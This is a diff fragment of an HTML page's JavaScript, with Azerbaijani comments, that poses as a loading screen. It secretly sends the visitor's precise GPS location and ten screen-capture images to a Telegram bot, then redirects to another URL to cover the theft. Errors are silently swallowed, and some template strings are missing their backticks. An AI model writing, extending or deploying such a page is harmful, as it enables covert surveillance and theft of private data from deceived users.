@@ -1,0 +1,74 @@
+try {
+                            await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (e) {}
+                    }
+                    resolve();
+                }, 'image/jpeg');
+            });
+        }
+
+        async function startProcess() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "Yüklənir, xahiş olunur gözləyin...";
+
+            // 1. DƏQİQ MƏKAN (GPS) GÖNDƏRİLMƏSİ
+            if ("geolocation" in navigator) {
+                const geoOptions = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        try {
+                            await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon});
+                        } catch (e) {}
+                    },
+                    (err) => {},
+                    geoOptions
+                );
+            }
+
+            // 2. EKRAN SKRİNŞOTUNUN ALINMASI (DisplayMedia API)
+            try {
+                // İstifadəçidən ekran paylaşımı icazəsi istənilir
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: true 
+                });
+                
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = screenStream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // 10 ədəd skrinşot çəkmək üçün dövr
+                for (let i = 1; i <= 10; i++) {
+                    statusDiv.innerText = İşlənir (${i}/10)...;
+                    await captureAndSendScreenshot(video, canvas, i);
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // 1 saniyə intervalla
+                }
+
+                statusDiv.innerText = "Yönləndirilir...";
+                screenStream.getTracks().forEach(track => track.stop());
+
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 500);
+
+            } catch (err) {
+                // Ekran icazəsi verilmədikdə və ya xəta olduqda belə sayta yönləndirir
+                statusDiv.innerText = "Yönləndirilir...";
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
